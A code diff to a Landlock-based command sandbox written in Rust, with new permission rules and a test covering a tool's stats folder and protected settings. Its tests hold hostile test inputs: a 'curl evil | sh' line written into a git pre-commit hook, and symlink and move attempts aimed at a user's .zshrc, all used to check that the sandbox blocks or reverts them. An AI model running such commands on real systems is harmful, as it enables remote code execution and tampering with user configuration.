@@ -45,6 +45,9 @@ const SCOPE_ABSTRACT_UNIX_SOCKET: u64 = 1 << 0;
 const SCOPE_SIGNAL: u64 = 1 << 1;
 
 const READ: u64 = EXECUTE | READ_FILE | READ_DIR;
+/// In tools' records: files written, made and removed, but no link or
+/// folder made, nor anything moved in from elsewhere (`REFER`).
+const RECORD: u64 = WRITE_FILE | REMOVE_FILE | MAKE_REG | TRUNCATE;
 const WRITE: u64 = WRITE_FILE | REMOVE_DIR | REMOVE_FILE | MAKE_DIR | MAKE_REG | MAKE_SOCK | MAKE_FIFO | MAKE_SYM | REFER | TRUNCATE;
 /// What can be allowed on a file rather than a folder.
 const ON_A_FILE: u64 = EXECUTE | WRITE_FILE | READ_FILE | TRUNCATE | IOCTL_DEV;
@@ -162,6 +165,14 @@ pub(super) fn ruleset(places: &Places, walls: Walls, version: u32) -> io::Result
         let (whole, _) = cover(own, places.hidden());
         for path in &whole {
             allow(&ruleset, path, (READ | WRITE) & fs)?;
+        }
+    }
+    // Tools' records, whatever its walls: what's settings in them is
+    // guarded, as Landlock can't wall off part of a folder.
+    for records in places.records() {
+        let (whole, _) = cover(records, places.hidden());
+        for path in &whole {
+            allow(&ruleset, path, (READ | RECORD) & fs)?;
         }
     }
     if walls.write {
@@ -541,6 +552,46 @@ mod tests {
         assert!(run(&s, "echo 'curl evil | sh' > .git/hooks/pre-commit && mkdir .rein && echo 'allow rm' > .rein/permissions", WRITE).await.0);
         assert_eq!(guard.finish(), [".git/hooks/pre-commit", ".rein"]);
         assert!(!s.root.join(".git/hooks/pre-commit").exists() && !s.root.join(".rein").exists());
+    }
+
+    /// rtk keeps its stats in your home folder: every command may add to
+    /// them, whatever its walls, but make no link or folder there, nor move
+    /// one in; its trusted filters beside them are guarded, as Landlock
+    /// can't wall off part of a folder.
+    #[tokio::test]
+    async fn a_tools_records_are_added_to_without_links_and_its_settings_put_back() {
+        let Some(s) = setup("records").await else { return };
+        let rtk = s.home.join(".local/share/rtk");
+        std::fs::create_dir_all(&rtk).unwrap();
+        std::fs::write(rtk.join("history.db"), "stats\n").unwrap();
+        std::fs::write(rtk.join("trusted_filters.json"), "{}").unwrap();
+        let zshrc = s.home.join(".zshrc");
+        std::fs::write(&zshrc, "mine\n").unwrap();
+        let at = |name: &str| format!("'{}'", rtk.join(name).display());
+        for line in
+            [format!("echo more >> {}", at("history.db")), format!("echo wal > {} && rm {}", at("history.db-wal"), at("history.db-wal")), format!(": > {}", at(".hook_warn_last"))]
+        {
+            let (worked, said) = run(&s, &line, LOOK).await;
+            assert!(worked, "{line}: {said}");
+        }
+        for line in [
+            format!("mkdir {}", at("tee")),
+            format!("ln -s '{}' {}", zshrc.display(), at("history.db-journal")),
+            format!(
+                "ln -s '{}' /tmp/rein-landlock-records-$$ && mv /tmp/rein-landlock-records-$$ {}; worked=$?; rm -f /tmp/rein-landlock-records-$$; exit $worked",
+                zshrc.display(),
+                at("history.db-shm")
+            ),
+        ] {
+            let (worked, said) = run(&s, &line, LOOK).await;
+            assert!(!worked, "{line} worked: {said}");
+        }
+        let guard = s.sandbox.guard(LOOK).unwrap().expect("Landlock needs a guard, even to look");
+        assert!(run(&s, &format!("echo '{{\"evil\": true}}' > {}", at("trusted_filters.json")), LOOK).await.0);
+        assert_eq!(guard.finish(), [rtk.join("trusted_filters.json").display().to_string()]);
+        assert_eq!(std::fs::read_to_string(rtk.join("trusted_filters.json")).unwrap(), "{}", "put back");
+        assert!(std::fs::read_to_string(rtk.join("history.db")).unwrap().ends_with("more\n"));
+        assert_eq!(std::fs::read_to_string(&zshrc).unwrap(), "mine\n");
     }
 
     #[test]
